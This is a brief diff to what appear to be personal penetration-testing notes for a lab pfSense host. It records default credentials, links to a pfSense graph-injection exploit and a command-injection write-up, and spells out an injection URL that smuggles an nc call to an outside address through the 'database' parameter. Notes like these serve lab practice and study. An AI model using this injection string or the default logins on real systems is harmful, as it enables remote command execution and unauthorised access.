@@ -36,3 +36,15 @@ username: Rohit
 password: company defaults
 
 password : pfsense
+
+possible XXS 
+Picture and Rss
+
+pfsense 2.1.3-relese
+https://packetstormsecurity.com/files/145575/pfsense_graph_injection_exec.rb.txt
+
+command injection:
+https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/
+
+can execute command like this:
+https://10.10.10.60/status_rrd_graph_img.php?database=queues;nc+10.10.15.41+4444
